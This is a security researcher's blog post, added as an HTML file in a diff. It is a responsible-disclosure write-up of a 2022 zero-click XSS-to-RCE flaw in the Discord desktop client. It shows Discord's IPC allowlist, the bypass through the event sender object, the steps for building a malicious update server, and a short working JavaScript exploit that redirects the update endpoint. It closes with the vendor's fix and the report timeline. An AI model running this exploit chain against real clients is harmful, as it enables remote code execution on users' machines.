@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='IPC allowlist bypass allowing to arbitary IPC calls setting a malicious update endpoint'>
+
+<link rel="icon" href="/img/avatar.png"><title>Discord 0-click XSS to RCE (2022)</title>
+
+<link rel='canonical' href='/discord-0click-xss-to-rce/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Discord 0-click XSS to RCE (2022)'>
+<meta property='og:description' content='IPC allowlist bypass allowing to arbitary IPC calls setting a malicious update endpoint'>
+<meta property='og:url' content='/discord-0click-xss-to-rce/'>
+<meta property='og:site_name' content='goose.icu'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-10-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-10-07T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Discord 0-click XSS to RCE (2022)">
+<meta name="twitter:description" content="IPC allowlist bypass allowing to arbitary IPC calls setting a malicious update endpoint">
+    </head>
+    <body class="">
+        <div class="container flex on-phone--column align-items--flex-start extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu09708bc55717c97a187e664e56a836fc_1890324_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">goose.icu</a></h1>
+        <h2 class="site-description">Software engineer @ ???? (check back Oct 1st 👀), perf @nodejs &#43; many side projects</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/discord-0click-xss-to-rce/">Discord 0-click XSS to RCE (2022)</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        IPC allowlist bypass allowing to arbitary IPC calls setting a malicious update endpoint
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Oct 07, 2022</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="discords-ipc-allowlist">Discord&rsquo;s IPC Allowlist</h2>
+<p>Discord expose a wrapped version of <code>ipcRenderer</code> for security, see <a class="link" href="/discord-1click-xss-to-rce" >my 1-click Discord XSS to RCE</a> for more details on Electron&rsquo;s IPC. It&rsquo;s implemented with a <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"  target="_blank" rel="noopener"
+    >Set</a>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">discordPrefixRegex</span> <span class="o">=</span> <span class="sr">/^DISCORD_/</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getDiscordIPCEvent</span><span class="p">(</span><span class="nx">ev</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">discordPrefixRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">ev</span><span class="p">)</span> <span class="o">?</span> <span class="nx">ev</span> <span class="o">:</span> <span class="sb">`DISCORD_</span><span class="si">${</span><span class="nx">ev</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">RENDERER_IPC_SEND_WHITELIST</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Set</span><span class="p">([</span> <span class="cm">/* ... */</span> <span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">send</span><span class="p">(</span><span class="nx">ev</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">prefixedEvent</span> <span class="o">=</span> <span class="nx">getDiscordIPCEvent</span><span class="p">(</span><span class="nx">ev</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">RENDERER_IPC_SEND_WHITELIST</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">prefixedEvent</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;cannot send this event&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">prefixedEvent</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This restricts the IPC calls we can make heavily, so it becomes not very useful to us.</p>
+<h2 id="bypassing-discords-ipc-protections">Bypassing Discord&rsquo;s IPC Protections</h2>
+<p>With Electron&rsquo;s <code>on</code> handler for IPC it includes the <code>sender</code> of the event, with Discord&rsquo;s wrapper the original event is unmodified and passed through:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">on</span><span class="p">(</span><span class="nx">ev</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="nx">getDiscordIPCEvent</span><span class="p">(</span><span class="nx">ev</span><span class="p">),</span> <span class="nx">callback</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>sender</code> allows use to bypass Discord&rsquo;s protections and use IPC arbitrarily with <code>event.sender.on</code>, <code>event.sender.invoke</code>, etc. So now we have arbitary IPC, how can we get to Node execution?</p>
+<h2 id="discord-settings">Discord Settings</h2>
+<p>Discord has a settings file, <code>settings.json</code>, which contain several options as key/value pairs in an object. One of these options is setting the update endpoint to update Discord&rsquo;s client from (<code>NEW_UPDATE_ENDPOINT</code> on Windows, <code>UPDATE_ENDPOINT</code> on Linux/Mac). I have previously made <a class="link" href="https://github.com/Goose-Nest/GooseUpdate"  target="_blank" rel="noopener"
+    >open source recreations of Discord&rsquo;s update server(s)</a>.</p>
+<p>Normally, Discord&rsquo;s IPC protections (allowlist) prevents us from modifying it, but with our bypass we can freely do it with <code>DISCORD_SETTINGS_SET</code>.</p>
+<h2 id="creating-a-malicious-update-server">Creating a Malicious Update Server</h2>
+<p>Discord&rsquo;s update server is quite complex and general so I won&rsquo;t go into details in this post. It uses native modules which I also explained in <a class="link" href="/discord-1click-xss-to-rce" >my 1-click Discord XSS to RCE</a>. I made a script which compiles a server by:</p>
+<ol>
+<li>Get the payload and add it into the <code>discord_desktop_core</code></li>
+<li>Recompute the hash for the module and bundle it into the expected format for the client</li>
+<li>Download the official update manifest</li>
+<li>Modify it so desktop core&rsquo;s version is increased causing it to update, and the hash matches the new one with our payload injected</li>
+<li>Point desktop core&rsquo;s download to our server and leave the rest to the official server</li>
+<li>Start a HTTP server on localhost with our modified manifest and desktop core</li>
+</ol>
+<h2 id="injecting-our-malicious-update-server">Injecting Our Malicious Update Server</h2>
+<p>Since we now have our malicious update server and a way to add it to the user&rsquo;s settings, we can make our exploit:</p>
+<ol>
+<li>Bypass Discord&rsquo;s IPC protections to achieve arbitary IPC</li>
+<li>Set a malicious update endpoint for the client to use</li>
+<li>Restart so the client is forced to update (Discord&rsquo;s client updates on every start)</li>
+<li>Our payload is executed</li>
+</ol>
+<p>Which looks like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">DiscordNative</span><span class="p">.</span><span class="nx">ipc</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;DISCORD_UPDATER_HISTORY_RESPONSE&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">({</span> <span class="nx">sender</span> <span class="p">})</span> <span class="p">{</span> <span class="c1">// Listen to event
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">sender</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="s1">&#39;DISCORD_SETTINGS_SET&#39;</span><span class="p">,</span> <span class="s1">&#39;NEW_UPDATE_ENDPOINT&#39;</span><span class="p">,</span> <span class="s1">&#39;http://localhost:9999/&#39;</span><span class="p">);</span> <span class="c1">// Set our custom malicious update server to be used
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">DiscordNative</span><span class="p">.</span><span class="nx">app</span><span class="p">.</span><span class="nx">relaunch</span><span class="p">();</span> <span class="c1">// Relaunch to force update now
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">DiscordNative</span><span class="p">.</span><span class="nx">ipc</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;DISCORD_UPDATER_HISTORY_QUERY_AND_TRUNCATE&#39;</span><span class="p">);</span> <span class="c1">// Trigger event so our listener is called
+</span></span></span></code></pre></div><h2 id="the-fix">The Fix</h2>
+<p>The fixed code makes sure the event isn&rsquo;t included in the callback (taken directly from the original code):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">on</span><span class="p">(</span><span class="nx">ev</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="nx">getDiscordIPCEvent</span><span class="p">(</span><span class="nx">ev</span><span class="p">),</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Sender is dangerous, do not expose.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">callback</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span> <span class="p">[</span><span class="kc">null</span><span class="p">,</span> <span class="p">...[...</span><span class="nx">arguments</span><span class="p">].</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="report-timeline">Report Timeline</h2>
+<ul>
+<li>26th July 2022: Reported to Discord via HackerOne</li>
+<li>27th July 2022: Confirmation of a high-severity issue</li>
+<li>16th August 2022: Fixed in Canary</li>
+<li>19th August 2022: Fixed in Stable</li>
+<li>2nd September 2022: Confirmation of fix from Discord</li>
+<li>2nd September 2022: $1500 bounty from Discord</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">&copy; 2023 goose.icu</section>
+    <section class="powerby">Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="1.1.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true" style="display:none">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+            </main>
+        </div>
+        <script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<link rel="stylesheet" href="/css/highlight/dark.min.css">
+
+    </body>
+</html>
